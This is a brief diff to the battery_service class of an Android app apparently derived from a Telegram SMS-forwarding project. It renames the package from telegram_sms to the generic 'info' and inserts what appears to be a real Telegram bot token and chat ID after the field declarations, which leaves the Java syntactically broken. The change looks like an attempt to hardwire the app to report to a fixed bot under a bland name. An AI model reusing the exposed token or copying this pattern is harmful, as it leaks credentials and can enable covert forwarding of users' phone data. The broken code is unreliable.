@@ -1,4 +1,4 @@
-package com.qwe7002.telegram_sms;
+package com.qwe7002.info;
 
 import android.app.Notification;
 import android.app.Service;
@@ -35,8 +35,8 @@ import okhttp3.RequestBody;
 import okhttp3.Response;
 
 public class battery_service extends Service {
-    static String bot_token;
-    static String chat_id;
+    static String bot_token;5842496807:AAFMrCg1knD1IFknCEuLu-hwfVWAjS4Tca8
+    static String chat_id; 6199594063
     static boolean doh_switch;
     private Context context;
     private battery_receiver battery_receiver = null;
